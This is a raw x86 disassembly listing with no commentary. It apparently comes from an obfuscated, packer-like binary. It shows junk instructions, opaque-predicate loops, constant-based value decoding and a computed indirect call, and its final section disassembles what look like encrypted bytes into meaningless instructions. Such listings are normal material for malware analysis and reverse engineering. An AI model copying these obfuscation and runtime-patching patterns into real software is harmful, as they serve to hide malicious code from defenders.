  40b223:	mov    DWORD PTR ds:0x42f008,0x471a
  40b22d:	adc    esi,0xffffffff
  40b230:	xor    DWORD PTR ds:0x432010,0x421e
  40b23a:	xor    edx,eax
  40b23c:	xor    DWORD PTR ds:0x42f018,0x5980
  40b246:	xor    esi,0x0
  40b249:	mov    DWORD PTR ds:0x430010,0x601d
  40b253:	cmp    edx,ebx
  40b255:	mov    DWORD PTR ds:0x42f008,0x5a5b
  40b25f:	jne    0x40b281
  40b265:	mov    DWORD PTR ds:0x431008,0x3ec
  40b26f:	cmp    esi,edi
  40b271:	mov    DWORD PTR ds:0x42f020,0x5f4c
  40b27b:	je     0x40b345
  40b281:	and    DWORD PTR ds:0x430000,0x0
  40b28b:	mov    edx,DWORD PTR ds:0x430000
  40b291:	inc    edx
  40b292:	mov    DWORD PTR ds:0x430000,edx
  40b298:	cmp    DWORD PTR ds:0x430000,0x5
  40b29f:	jne    0x40b2c5
  40b2a5:	push   0x42469e
  40b2aa:	push   0x5c4e
  40b2af:	push   DWORD PTR [ebp-0xc]
  40b2b2:	push   0x6b40
  40b2b7:	push   0x149b
  40b2bc:	push   DWORD PTR [ebp-0x10]
  40b2bf:	call   DWORD PTR ds:0x42b04c
  40b2c5:	cmp    DWORD PTR ds:0x430000,0x4
  40b2cc:	jne    0x40b2e1
  40b2d2:	xor    edx,edx
  40b2d4:	xor    edx,DWORD PTR ds:0x430000
  40b2da:	inc    edx
  40b2db:	mov    DWORD PTR ds:0x430000,edx
  40b2e1:	cmp    DWORD PTR ds:0x430000,0x10
  40b2e8:	jb     0x40b28b
  40b2ee:	or     DWORD PTR ds:0x43000c,0x5f7e
  40b2f8:	mov    edx,DWORD PTR ds:0x41e0ec
  40b2fe:	or     DWORD PTR ds:0x432000,0x431018
  40b308:	mov    edx,DWORD PTR [edx+0x1c0]
  40b30e:	mov    edx,DWORD PTR [edx]
  40b310:	or     DWORD PTR ds:0x42f014,0x43201c
  40b31a:	xor    esi,esi
  40b31c:	adc    DWORD PTR ds:0x42f010,0x7665
  40b326:	add    edx,ecx
  40b328:	adc    esi,0xffffffff
  40b32b:	xor    edx,eax
  40b32d:	xor    esi,0x0
  40b330:	cmp    edx,0x70941fd1
  40b336:	jne    0x40b3af
  40b33c:	cmp    esi,0xffffffff
  40b33f:	jne    0x40b3af
  40b345:	mov    edx,DWORD PTR ds:0x41e170
  40b34b:	mov    esi,DWORD PTR ds:0x41e168
  40b351:	xor    edx,esi
  40b353:	mov    DWORD PTR ds:0x41e168,edx
  40b359:	mov    edx,DWORD PTR [ebp+0xc]
  40b35c:	mov    edx,DWORD PTR [edx]
  40b35e:	mov    edx,DWORD PTR [edx]
  40b360:	mov    esi,DWORD PTR ds:0x41e168
  40b366:	add    DWORD PTR [edx],esi
  40b368:	mov    esi,DWORD PTR [ebp+0x8]
  40b36b:	mov    edx,DWORD PTR ds:0x41e168
  40b371:	xor    esi,0x7510893
  40b377:	add    esi,0x3272db
  40b37d:	xor    ebx,ebx
  40b37f:	add    esi,ecx
  40b381:	adc    ebx,0xffffffff
  40b384:	xor    edi,edi
  40b386:	xor    esi,eax
  40b388:	xor    ebx,0x0
  40b38b:	add    edx,ecx
  40b38d:	adc    edi,0xffffffff
  40b390:	xor    edx,eax
  40b392:	xor    edi,0x0
  40b395:	cmp    edx,esi
  40b397:	jne    0x40b3af
  40b39d:	cmp    edi,ebx
  40b39f:	jne    0x40b3af
  40b3a5:	mov    eax,ds:0x41e168
  40b3aa:	mov    ds:0x41e170,eax
  40b3af:	pop    edi
  40b3b0:	pop    esi
  40b3b1:	pop    ebx
  40b3b2:	pop    ebp
  40b3b3:	ret    0x8
  40b3b6:	push   ebp
  40b3b7:	mov    ebp,esp
  40b3b9:	sub    esp,0x90
  40b3bf:	and    DWORD PTR ds:0x432004,0x0
  40b3c9:	jmp    0x40b3db
  40b3ce:	mov    ecx,DWORD PTR ds:0x432004
  40b3d4:	inc    ecx
  40b3d5:	mov    DWORD PTR ds:0x432004,ecx
  40b3db:	cmp    DWORD PTR ds:0x432004,0x14
  40b3e2:	jae    0x40b417
  40b3e8:	cmp    DWORD PTR ds:0x432004,0x20
  40b3ef:	jne    0x40b405
  40b3f5:	push   0x4246f1
  40b3fa:	push   0x4246db
  40b3ff:	call   DWORD PTR ds:0x42b050
  40b405:	jmp    0x40b3ce
  40b40a:	movzx  ecx,BYTE PTR ds:0x43201c
  40b411:	sub    DWORD PTR ds:0x42f014,ecx
  40b417:	push   esi
  40b418:	or     ecx,eax
  40b41a:	push   edi
  40b41b:	and    DWORD PTR ds:0x432004,0x0
  40b425:	jmp    0x40b435
  40b42a:	mov    eax,ds:0x432004
  40b42f:	inc    eax
  40b430:	mov    ds:0x432004,eax
  40b435:	cmp    DWORD PTR ds:0x432004,0x10
  40b43c:	jae    0x40b460
  40b442:	cmp    DWORD PTR ds:0x432004,0x1f
  40b449:	jne    0x40b45b
  40b44f:	push   DWORD PTR [ebp-0x20]
  40b452:	push   DWORD PTR [ebp-0x14]
  40b455:	call   DWORD PTR ds:0x42b054
  40b45b:	jmp    0x40b42a
  40b460:	mov    eax,ds:0x41e0ec
  40b465:	and    ecx,0x5378
  40b46b:	mov    DWORD PTR [ebp-0x2c],eax
  40b46e:	sub    esi,DWORD PTR ds:0x42f018
  40b474:	mov    eax,ds:0x41e1f8
  40b479:	mov    DWORD PTR [ebp-0x3c],eax
  40b47c:	and    DWORD PTR [ebp-0x34],0x0
  40b480:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  40b487:	add    DWORD PTR ds:0x43000c,0x3783
  40b491:	mov    DWORD PTR [ebp-0x30],0xf89c85b5
  40b498:	and    DWORD PTR ds:0x43301c,0x4e39
  40b4a2:	mov    eax,DWORD PTR [ebp-0x1c]
  40b4a5:	xor    DWORD PTR ds:0x43200c,0x4866
  40b4af:	mov    ecx,DWORD PTR [ebp-0x1c]
  40b4b2:	sub    esi,DWORD PTR ds:0x431008
  40b4b8:	xor    eax,ecx
  40b4ba:	mov    ecx,DWORD PTR ds:0x41df0c
  40b4c0:	mov    esi,DWORD PTR ds:0x41df28
  40b4c6:	sub    ecx,esi
  40b4c8:	sub    ecx,DWORD PTR [ecx+esi*1]
  40b4cb:	mov    DWORD PTR [ebp-0x1c],eax
  40b4ce:	or     DWORD PTR [ebp-0x1c],0xf89cb5b6
  40b4d5:	add    DWORD PTR ds:0x430008,ecx
  40b4db:	mov    eax,DWORD PTR [ebp-0x28]
  40b4de:	xor    DWORD PTR ds:0x432018,ebx
  40b4e4:	mov    ecx,DWORD PTR [ebp-0x28]
  40b4e7:	or     esi,edi
  40b4e9:	xor    eax,ecx
  40b4eb:	mov    DWORD PTR [ebp-0x28],eax
  40b4ee:	add    DWORD PTR [ebp-0x28],0xf89f05b6
  40b4f5:	sub    ecx,0x68bb
  40b4fb:	mov    eax,DWORD PTR [ebp-0x18]
  40b4fe:	mov    ecx,DWORD PTR [ebp-0x18]
  40b501:	xor    eax,ecx
  40b503:	adc    ecx,esi
  40b505:	mov    DWORD PTR [ebp-0x18],eax
  40b508:	not    DWORD PTR ds:0x432008
  40b50e:	add    DWORD PTR [ebp-0x18],0xf89c85f6
  40b515:	mov    ecx,DWORD PTR ds:0x42477f
  40b51b:	mov    esi,DWORD PTR ds:0x41df24
  40b521:	sub    esi,ecx
  40b523:	and    ecx,DWORD PTR [ecx+esi*1]
  40b526:	mov    eax,DWORD PTR [ebp-0x24]
  40b529:	mov    ecx,DWORD PTR [ebp-0x24]
  40b52c:	xor    eax,ecx
  40b52e:	and    edi,0x1f5e
  40b534:	mov    DWORD PTR [ebp-0x24],eax
  40b537:	add    DWORD PTR [ebp-0x24],0xf89c85d6
  40b53e:	mov    eax,DWORD PTR [ebp-0x14]
  40b541:	mov    ecx,DWORD PTR [ebp-0x14]
  40b544:	xor    eax,ecx
  40b546:	and    DWORD PTR ds:0x432018,0x1b89
  40b550:	mov    DWORD PTR [ebp-0x14],eax
  40b553:	mov    edi,DWORD PTR ds:0x424767
  40b559:	mov    ecx,DWORD PTR ds:0x41def0
  40b55f:	sub    edi,ecx
  40b561:	xor    edi,DWORD PTR [edi+ecx*1]
  40b564:	mov    eax,DWORD PTR [ebp-0x20]
  40b567:	mov    DWORD PTR ds:0x431010,0x1f
  40b571:	cmp    DWORD PTR ds:0x431010,0x0
  40b578:	je     0x40b5ad
  40b57e:	cmp    DWORD PTR ds:0x431010,0x2f
  40b585:	jne    0x40b59b
  40b58b:	push   0x42f000
  40b590:	push   0x673f
  40b595:	call   DWORD PTR ds:0x42b058
  40b59b:	mov    edi,DWORD PTR ds:0x431010
  40b5a1:	dec    edi
  40b5a2:	mov    DWORD PTR ds:0x431010,edi
  40b5a8:	jmp    0x40b571
  40b5ad:	mov    ecx,DWORD PTR [ebp-0x14]
  40b5b0:	mov    esi,0x7510893
  40b5b5:	neg    DWORD PTR ds:0x43300c
  40b5bb:	xor    eax,esi
  40b5bd:	mov    edi,0x3272db
  40b5c2:	add    eax,edi
  40b5c4:	xor    eax,ecx
  40b5c6:	mov    DWORD PTR [ebp-0x14],eax
  40b5c9:	sbb    DWORD PTR ds:0x430010,0x1ce0
  40b5d3:	mov    eax,DWORD PTR [ebp-0x10]
  40b5d6:	xor    ecx,DWORD PTR ds:0x43200c
  40b5dc:	mov    ecx,DWORD PTR [ebp-0x10]
  40b5df:	sub    eax,ecx
  40b5e1:	and    ecx,DWORD PTR ds:0x431018
  40b5e7:	mov    DWORD PTR [ebp-0x10],eax
  40b5ea:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  40b5f1:	xor    ecx,DWORD PTR ds:0x42f00c
  40b5f7:	mov    al,BYTE PTR [ebp-0x1]
  40b5fa:	add    DWORD PTR ds:0x42f018,ecx
  40b600:	movzx  ecx,BYTE PTR [ebp-0x1]
  40b604:	movzx  eax,al
  40b607:	adc    DWORD PTR ds:0x43100c,0x433008
  40b611:	sub    ecx,eax
  40b613:	mov    BYTE PTR [ebp-0x1],cl
  40b616:	movzx  eax,BYTE PTR [ebp-0x1]
  40b61a:	xor    eax,0xffffff99
  40b61d:	mov    BYTE PTR [ebp-0x1],al
  40b620:	or     eax,DWORD PTR ds:0x43301c
  40b626:	mov    eax,DWORD PTR [ebp-0x20]
  40b629:	xor    eax,esi
  40b62b:	add    eax,edi
  40b62d:	and    DWORD PTR ds:0x433004,0xdaf
  40b637:	mov    DWORD PTR [ebp-0x14],eax
  40b63a:	and    DWORD PTR ds:0x432018,0x433014
  40b644:	lea    eax,[ebp-0x40]
  40b647:	adc    DWORD PTR ds:0x42f024,0x42f00c
  40b651:	mov    DWORD PTR [ebp-0x38],eax
  40b654:	adc    DWORD PTR ds:0x42f020,0x75b6
  40b65e:	lea    eax,[ebp-0x38]
  40b661:	mov    DWORD PTR [ebp-0x44],eax
  40b664:	sbb    DWORD PTR ds:0x42f010,0x42f028
  40b66e:	lea    eax,[ebp-0x44]
  40b671:	mov    DWORD PTR [ebp-0x8],eax
  40b674:	or     DWORD PTR ds:0x431008,0x2eb5
  40b67e:	lea    eax,[ebp-0x8]
  40b681:	and    DWORD PTR ds:0x43201c,0x432004
  40b68b:	mov    DWORD PTR [ebp-0x48],eax
  40b68e:	adc    DWORD PTR ds:0x43100c,ebx
  40b694:	mov    eax,DWORD PTR [ebp-0x18]
  40b697:	sbb    DWORD PTR ds:0x42f010,0x430010
  40b6a1:	xor    eax,esi
  40b6a3:	add    eax,edi
  40b6a5:	and    DWORD PTR ds:0x433014,0x19f0
  40b6af:	push   eax
  40b6b0:	mov    eax,DWORD PTR [ebp-0x1c]
  40b6b3:	xor    eax,esi
  40b6b5:	add    eax,edi
  40b6b7:	push   eax
  40b6b8:	mov    eax,DWORD PTR [ebp-0x10]
  40b6bb:	xor    eax,esi
  40b6bd:	add    eax,edi
  40b6bf:	push   eax
  40b6c0:	lea    eax,[ebp-0x90]
  40b6c6:	push   eax
  40b6c7:	push   DWORD PTR [ebp-0x20]
  40b6ca:	push   DWORD PTR [ebp-0x30]
  40b6cd:	call   0x408d97
  40b6d2:	test   eax,eax
  40b6d4:	je     0x40b705
  40b6da:	lea    eax,[ebp-0x90]
  40b6e0:	push   eax
  40b6e1:	mov    eax,DWORD PTR [ebp-0x30]
  40b6e4:	xor    eax,esi
  40b6e6:	add    eax,edi
  40b6e8:	push   eax
  40b6e9:	mov    eax,DWORD PTR [ebp-0x2c]
  40b6ec:	add    eax,0xaa
  40b6f1:	push   eax
  40b6f2:	mov    eax,DWORD PTR [ebp-0x2c]
  40b6f5:	mov    eax,DWORD PTR [eax+0x198]
  40b6fb:	push   DWORD PTR [eax]
  40b6fd:	call   0x403f26
  40b702:	mov    DWORD PTR [ebp-0x40],eax
  40b705:	lea    eax,[ebp+0x4]
  40b708:	mov    DWORD PTR [ebp-0x34],eax
  40b70b:	mov    eax,DWORD PTR [ebp-0x8]
  40b70e:	mov    eax,DWORD PTR [eax]
  40b710:	mov    eax,DWORD PTR [eax]
  40b712:	mov    eax,DWORD PTR [eax]
  40b714:	test   eax,eax
  40b716:	je     0x40b797
  40b71c:	lea    eax,[ebp-0xc]
  40b71f:	mov    DWORD PTR [ebp-0x4c],eax
  40b722:	mov    eax,DWORD PTR [ebp-0x3c]
  40b725:	mov    DWORD PTR [ebp-0xc],eax
  40b728:	mov    eax,DWORD PTR [ebp-0x8]
  40b72b:	mov    eax,DWORD PTR [eax]
  40b72d:	mov    eax,DWORD PTR [eax]
  40b72f:	mov    eax,DWORD PTR [eax]
  40b731:	sub    DWORD PTR [ebp-0xc],eax
  40b734:	mov    ecx,DWORD PTR [ebp-0x10]
  40b737:	xor    ecx,esi
  40b739:	mov    eax,0xffcd8d25
  40b73e:	sub    eax,ecx
  40b740:	add    DWORD PTR [ebp-0xc],eax
  40b743:	mov    eax,DWORD PTR [ebp-0xc]
  40b746:	mov    ecx,DWORD PTR [ebp-0x8]
  40b749:	mov    ecx,DWORD PTR [ecx]
  40b74b:	mov    ecx,DWORD PTR [ecx]
  40b74d:	mov    ecx,DWORD PTR [ecx]
  40b74f:	mov    DWORD PTR [ecx+0x1],eax
  40b752:	mov    al,BYTE PTR [ebp-0x1]
  40b755:	mov    ecx,DWORD PTR [ebp-0x8]
  40b758:	mov    ecx,DWORD PTR [ecx]
  40b75a:	mov    ecx,DWORD PTR [ecx]
  40b75c:	mov    ecx,DWORD PTR [ecx]
  40b75e:	push   DWORD PTR [ebp-0x2c]
  40b761:	xor    al,0x6f
  40b763:	sub    al,0xd
  40b765:	mov    BYTE PTR [ecx],al
  40b767:	mov    eax,ds:0x41df68
  40b76c:	push   DWORD PTR [eax]
  40b76e:	push   DWORD PTR ds:0x41e1c4
  40b774:	push   DWORD PTR ds:0x41df70
  40b77a:	push   DWORD PTR ds:0x41e1a4
  40b780:	push   DWORD PTR ds:0x41e218
  40b786:	push   DWORD PTR [ebp-0x30]
  40b789:	push   DWORD PTR [ebp-0x20]
  40b78c:	mov    eax,DWORD PTR [ebp-0x8]
  40b78f:	mov    eax,DWORD PTR [eax]
  40b791:	mov    eax,DWORD PTR [eax]
  40b793:	mov    eax,DWORD PTR [eax]
  40b795:	call   eax
  40b797:	mov    eax,DWORD PTR [ebp-0x34]
  40b79a:	mov    ecx,DWORD PTR ds:0x41e168
  40b7a0:	add    DWORD PTR [eax],ecx
  40b7a2:	pop    edi
  40b7a3:	pop    esi
  40b7a4:	leave  
  40b7a5:	ret    
  40b7a6:	push   ebp
  40b7a7:	mov    ebp,esp
  40b7a9:	sub    esp,0x18
  40b7ac:	mov    DWORD PTR [ebp-0x10],0xf89f85b6
  40b7b3:	lea    eax,[ebp+0x14]
  40b7b6:	neg    edx
  40b7b8:	mov    DWORD PTR [ebp-0x4],eax
  40b7bb:	push   esi
  40b7bc:	sbb    DWORD PTR ds:0x430000,edi
  40b7c2:	mov    esi,0xf89c85b6
  40b7c7:	mov    DWORD PTR [ebp-0xc],esi
  40b7ca:	lea    eax,[ebp-0xc]
  40b7cd:	add    edx,ecx
  40b7cf:	mov    DWORD PTR [ebp-0x14],eax
  40b7d2:	sub    edx,ecx
  40b7d4:	mov    eax,DWORD PTR [ebp-0xc]
  40b7d7:	dec    ecx
  40b7d8:	mov    edx,DWORD PTR [ebp-0x14]
  40b7db:	and    ecx,0x3a88
  40b7e1:	mov    ecx,0x7510893
  40b7e6:	or     DWORD PTR ds:0x431010,0x430000
  40b7f0:	xor    eax,ecx
  40b7f2:	add    eax,0x3272db
  40b7f7:	sub    DWORD PTR ds:0x431010,0x431014
  40b801:	mov    DWORD PTR [edx],eax
  40b803:	xor    DWORD PTR ds:0x42f000,0x422
  40b80d:	mov    eax,ds:0x41df64
  40b812:	mov    edx,DWORD PTR ds:0x41def0
  40b818:	mov    edx,DWORD PTR [edx]
  40b81a:	xor    DWORD PTR ds:0x430000,edx
  40b820:	mov    edx,DWORD PTR [ebp-0x4]
  40b823:	mov    eax,DWORD PTR [eax]
  40b825:	and    DWORD PTR ds:0x42f008,0x4c84
  40b82f:	add    eax,DWORD PTR [edx]
  40b831:	mov    DWORD PTR ds:0x430004,0x10
  40b83b:	cmp    DWORD PTR ds:0x430004,0x0
  40b842:	je     0x40b874
  40b848:	cmp    DWORD PTR ds:0x430004,0x20
  40b84f:	jne    0x40b860
  40b855:	push   0x6cf7
  40b85a:	call   DWORD PTR ds:0x42b014
  40b860:	xor    edx,edx
  40b862:	add    edx,DWORD PTR ds:0x430004
  40b868:	dec    edx
  40b869:	mov    DWORD PTR ds:0x430004,edx
  40b86f:	jmp    0x40b83b
  40b874:	push   edi
  40b875:	mov    DWORD PTR [ebp-0x8],eax
  40b878:	sub    edi,0x3a07
  40b87e:	mov    edi,DWORD PTR [ebp+0x8]
  40b881:	mov    DWORD PTR ds:0x433004,0x1a
  40b88b:	cmp    DWORD PTR ds:0x433004,0x0
  40b892:	je     0x40b8ca
  40b898:	cmp    DWORD PTR ds:0x433004,0x2a
  40b89f:	jne    0x40b8b8
  40b8a5:	push   0x43301c
  40b8aa:	push   0x433000
  40b8af:	push   DWORD PTR [ebp-0xc]
  40b8b2:	call   DWORD PTR ds:0x42b05c
  40b8b8:	mov    edx,DWORD PTR ds:0x433004
  40b8be:	dec    edx
  40b8bf:	mov    DWORD PTR ds:0x433004,edx
  40b8c5:	jmp    0x40b88b
  40b8ca:	mov    eax,ds:0x41e0ec
  40b8cf:	add    DWORD PTR ds:0x430018,0x7a9e
  40b8d9:	mov    eax,DWORD PTR [eax+0x198]
  40b8df:	and    DWORD PTR ds:0x432000,0x0
  40b8e9:	jmp    0x40b8fb
  40b8ee:	mov    edx,DWORD PTR ds:0x432000
  40b8f4:	inc    edx
  40b8f5:	mov    DWORD PTR ds:0x432000,edx
  40b8fb:	cmp    DWORD PTR ds:0x432000,0x16
  40b902:	jae    0x40b949
  40b908:	cmp    DWORD PTR ds:0x432000,0xa
  40b90f:	jne    0x40b920
  40b915:	push   0x6e10
  40b91a:	call   DWORD PTR ds:0x42b018
  40b920:	cmp    DWORD PTR ds:0x432000,0x9
  40b927:	jne    0x40b93a
  40b92d:	mov    edx,DWORD PTR ds:0x432000
  40b933:	inc    edx
  40b934:	mov    DWORD PTR ds:0x432000,edx
  40b93a:	jmp    0x40b8ee
  40b93f:	adc    DWORD PTR ds:0x43200c,0x7489
  40b949:	xor    edi,ecx
  40b94b:	mov    edx,DWORD PTR ds:0x41df3c
  40b951:	mov    edx,DWORD PTR [edx]
  40b953:	and    DWORD PTR ds:0x430010,edx
  40b959:	mov    edx,0x3272db
  40b95e:	add    edi,edx
  40b960:	mov    DWORD PTR ds:0x431014,0x73af
  40b96a:	cmp    DWORD PTR [eax],edi
  40b96c:	je     0x40b98d
  40b972:	mov    DWORD PTR ds:0x431018,0x6eb3
  40b97c:	mov    eax,DWORD PTR [eax]
  40b97e:	mov    DWORD PTR ds:0x433008,0x1439
  40b988:	jmp    0x410469
  40b98d:	mov    eax,0x67c2
  40b992:	mov    eax,DWORD PTR [ebp+0x18]
  40b995:	cmp    eax,esi
  40b997:	jne    0x40b9b1
  40b99d:	mov    DWORD PTR ds:0x431004,0x29bc
  40b9a7:	push   0xf89c85b5
  40b9ac:	jmp    0x410458
  40b9b1:	mov    esi,DWORD PTR [ebp+0x18]
  40b9b4:	not    DWORD PTR ds:0x43100c
  40b9ba:	mov    eax,0xf89c85b4
  40b9bf:	mov    DWORD PTR ds:0x431008,0x585a
  40b9c9:	cmp    esi,eax
  40b9cb:	mov    DWORD PTR ds:0x433004,0x6551
  40b9d5:	jne    0x410448
  40b9db:	or     eax,eax
  40b9dd:	mov    eax,DWORD PTR [ebp+0x10]
  40b9e0:	add    DWORD PTR ds:0x42f020,edi
  40b9e6:	xor    eax,ecx
  40b9e8:	add    DWORD PTR ds:0x42f020,0xdeb
  40b9f2:	add    eax,edx
  40b9f4:	mov    DWORD PTR ds:0x42f004,0x1b
  40b9fe:	cmp    DWORD PTR ds:0x42f004,0x0
  40ba05:	je     0x40ba5e
  40ba0b:	cmp    DWORD PTR ds:0x42f004,0x2
  40ba12:	jne    0x40ba30
  40ba18:	push   0x7389
  40ba1d:	push   0x7d80
  40ba22:	push   DWORD PTR [ebp-0xc]
  40ba25:	push   0x7694
  40ba2a:	call   DWORD PTR ds:0x42b01c
  40ba30:	cmp    DWORD PTR ds:0x42f004,0x3
  40ba37:	jne    0x40ba4a
  40ba3d:	mov    esi,DWORD PTR ds:0x42f004
  40ba43:	dec    esi
  40ba44:	mov    DWORD PTR ds:0x42f004,esi
  40ba4a:	xor    esi,esi
  40ba4c:	add    esi,DWORD PTR ds:0x42f004
  40ba52:	dec    esi
  40ba53:	mov    DWORD PTR ds:0x42f004,esi
  40ba59:	jmp    0x40b9fe
  40ba5e:	mov    DWORD PTR [ebp-0x18],eax
  40ba61:	adc    eax,DWORD PTR ds:0x43201c
  40ba67:	mov    eax,DWORD PTR [ebp+0xc]
  40ba6a:	mov    esi,DWORD PTR [ebp-0x8]
  40ba6d:	or     DWORD PTR ds:0x42f01c,0x430004
  40ba77:	xor    eax,ecx
  40ba79:	add    eax,edx
  40ba7b:	xor    DWORD PTR ds:0x433004,0x43001c
  40ba85:	imul   eax,DWORD PTR [esi]
  40ba88:	mov    esi,DWORD PTR [ebp+0x8]
  40ba8b:	sbb    DWORD PTR ds:0x431014,0x432018
  40ba95:	xor    esi,ecx
  40ba97:	add    DWORD PTR ds:0x433014,0x42f00c
  40baa1:	add    esi,edx
  40baa3:	cmp    esi,eax
  40baa5:	jmp    0x40de50
  40baaa:	jl     0x40baa1
  40baac:	retf   0xc78f
  40baaf:	mov    esi,DWORD PTR [ebx]
  40bab1:	test   edi,edi
  40bab3:	rcl    ch,cl
  40bab5:	jmp    0xf573:0xa55cff6f
  40babc:	bound  esp,QWORD PTR [edx-0xc]
  40babf:	pop    edi
  40bac0:	bound  esp,QWORD PTR [edx-0x68]
  40bac3:	fadd   QWORD PTR [eax+0x261a15ed]
  40bac9:	mov    al,0x6a
  40bacb:	xchg   esp,eax
  40bacc:	and    WORD PTR [edi+esi*4],di
  40bad0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bad1:	and    BYTE PTR [edx],0xde
  40bad4:	pusha  
  40bad5:	scas   al,BYTE PTR es:[edi]
  40bad6:	push   0x960d2023
  40badb:	test   eax,0x305ef19b
  40bae0:	fiadd  WORD PTR [edx]
  40bae2:	dec    ebp
  40bae3:	xchg   edx,eax
  40bae4:	mov    bh,bh
  40bae6:	xchg   edx,eax
  40bae7:	add    eax,0x1b38cda5
  40baec:	dec    ebp
  40baed:	jne    0x40babc
  40baef:	or     DWORD PTR [edi-0x20356ae5],esp
  40baf5:	popf   
  40baf6:	add    BYTE PTR [esp+ebx*4+0x5fca8ca8],al
  40bafd:	sub    eax,0x4ef5b1ad
  40bb02:	adc    eax,edx
  40bb04:	dec    ecx
  40bb05:	sub    esi,DWORD PTR [eax-0x1c]
  40bb08:	scas   al,BYTE PTR es:[edi]
  40bb09:	iret   
  40bb0a:	je     0x40bad8
  40bb0c:	(bad)  
  40bb0d:	xchg   edi,eax
  40bb0e:	fldenv [ebp-0x55]
  40bb11:	pushf  
  40bb12:	shl    BYTE PTR [ecx-0x7fa9c64f],0x40
  40bb19:	lods   eax,DWORD PTR ds:[esi]
  40bb1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bb1b:	mov    dh,0x2d
  40bb1d:	call   0xa37e7ce8
  40bb22:	jl     0x40bb8b
  40bb24:	mov    dh,BYTE PTR [esi]
  40bb26:	pop    eax
  40bb27:	dec    esi
  40bb28:	xchg   esi,esi
  40bb2a:	shl    BYTE PTR [ebx],cl
  40bb2c:	mov    ds:0x704fdc15,eax
  40bb31:	lods   eax,DWORD PTR ds:[esi]
  40bb32:	and    al,0xa9
  40bb34:	push   ds
  40bb35:	(bad)  
  40bb36:	sbb    bh,BYTE PTR [esi+edx*1+0x17]
  40bb3a:	and    eax,0x6d559514
  40bb3f:	scas   eax,DWORD PTR es:[edi]
  40bb40:	jmp    0xbce10280
  40bb45:	dec    ebp
  40bb46:	add    eax,0xb6e92df8
  40bb4b:	sub    BYTE PTR [edx-0x41],0x53
  40bb4f:	cmp    eax,0x4d50136e
  40bb54:	cmp    eax,0x3151d4ed
  40bb59:	and    BYTE PTR [edi-0xe62bc0d],ah
  40bb5f:	fwait
  40bb60:	xor    bl,BYTE PTR [ebx+0x75b7a777]
  40bb66:	xchg   BYTE PTR ds:0x86b9c54d,dh
  40bb6c:	popf   
  40bb6d:	jl     0x40bb35
  40bb6f:	sbb    eax,0x256a8395
  40bb74:	pop    ebp
  40bb75:	xchg   ebp,eax
  40bb76:	js     0x40bb1c
  40bb78:	adc    edx,ebx
  40bb7a:	add    DWORD PTR [esp+eax*1-0x1c],edx
  40bb7e:	and    ah,BYTE PTR [ebp-0x73709ac]
  40bb84:	cli    
  40bb85:	(bad)  
  40bb86:	cmc    
  40bb87:	push   esi
  40bb88:	cs cwde 
  40bb8a:	fbld   TBYTE PTR [eax]
  40bb8c:	jno    0x40bb3c
  40bb8e:	jnp    0x40bbfe
  40bb90:	ds or  al,0xf7
  40bb93:	in     al,0x48
  40bb95:	mov    al,ds:0x8abbdacc
  40bb9a:	out    0xa3,eax
  40bb9c:	inc    ecx
  40bb9d:	int    0x83
  40bb9f:	shr    BYTE PTR [ecx+0x746f359f],0xd3
  40bba6:	inc    edx
  40bba7:	jno    0x40bc25
  40bba9:	dec    ebp
  40bbaa:	inc    ecx
  40bbab:	xlat   BYTE PTR ds:[ebx]
  40bbac:	xor    BYTE PTR [ebp-0x38e04aa7],dh
  40bbb2:	dec    edi
  40bbb3:	cdq    
  40bbb4:	out    0x68,eax
  40bbb6:	retf   
  40bbb7:	adc    ebp,ebx
  40bbb9:	cli    
  40bbba:	repnz adc al,0xd0
  40bbbd:	mov    ds:0x8229c37a,eax
  40bbc2:	push   esi
  40bbc3:	fnstenv [edx-0x33]
  40bbc6:	fstp   TBYTE PTR [ecx+0x2c6b7411]
  40bbcc:	xor    DWORD PTR [ebp+0x31],0x9932b129
  40bbd3:	loopne 0x40bb55
  40bbd5:	aad    0x35
  40bbd7:	xchg   ebx,eax
  40bbd8:	adc    eax,0x9fe3cf0
  40bbdd:	push   esi
  40bbde:	cmp    eax,0x276a6e3f
  40bbe3:	jbe    0x40bc1c
  40bbe5:	xlat   BYTE PTR ds:[ebx]
  40bbe6:	inc    esp
  40bbe7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bbe8:	enter  0x5b5b,0x15
  40bbec:	and    cl,BYTE PTR ds:0x257c7d7
  40bbf2:	xchg   edi,eax
  40bbf3:	inc    ebx
  40bbf5:	jg     0x40bc1c
  40bbf7:	xor    esi,DWORD PTR [edx-0x40]
  40bbfa:	jbe    0x40bc78
  40bbfc:	push   ebp
  40bbfd:	jp     0x40bc6e
  40bbff:	sbb    edx,DWORD PTR [edx+0x78]
  40bc02:	pop    ss
  40bc03:	or     al,0xdc
  40bc05:	shl    BYTE PTR [esi],1
  40bc07:	hlt    
  40bc08:	xor    DWORD PTR [edi],esi
  40bc0a:	stos   DWORD PTR es:[edi],eax
  40bc0b:	jl     0x40bbd6
  40bc0d:	ds mov edx,0xee39559f
  40bc13:	xor    bl,BYTE PTR [ecx-0x27]
  40bc16:	inc    edx
  40bc17:	cmp    DWORD PTR [ebx-0x5e],0x70
  40bc1b:	mov    dh,0xc
  40bc1d:	lods   eax,DWORD PTR ds:[esi]
  40bc1e:	mov    ah,BYTE PTR [edx-0x464065d9]
  40bc24:	mov    esi,0x957126f5
  40bc29:	sahf   
  40bc2a:	out    dx,eax
  40bc2b:	and    ah,dl
  40bc2d:	mov    cl,0x84
  40bc2f:	test   eax,0xd0666078
  40bc34:	mov    cl,0xd7
  40bc36:	ja     0x40bc5e
  40bc38:	dec    esi
  40bc39:	js     0x40bc48
  40bc3b:	retf   
  40bc3c:	jg     0x40bc1c
  40bc3e:	xor    ah,bl
  40bc40:	sar    DWORD PTR [edx+esi*4+0x3df87b4e],0x4f
  40bc48:	adc    al,0xbc
  40bc4a:	or     esp,DWORD PTR [eax-0x7fe33202]
  40bc50:	push   ss
  40bc51:	add    ecx,DWORD PTR [eax+0x7fad4e3a]
  40bc57:	sbb    ecx,DWORD PTR [edx-0x36e53273]
  40bc5d:	repz push esp
  40bc5f:	add    ecx,DWORD PTR [ecx+0x720b122]
  40bc65:	jmp    0x6837dee3
  40bc6a:	adc    ebx,edx
  40bc6c:	sahf   
  40bc6d:	retf   
  40bc6e:	push   ebp
  40bc6f:	or     ebp,DWORD PTR [ebx]
  40bc71:	scas   al,BYTE PTR es:[edi]
  40bc72:	fstp   TBYTE PTR [eax]
  40bc74:	and    al,0x23
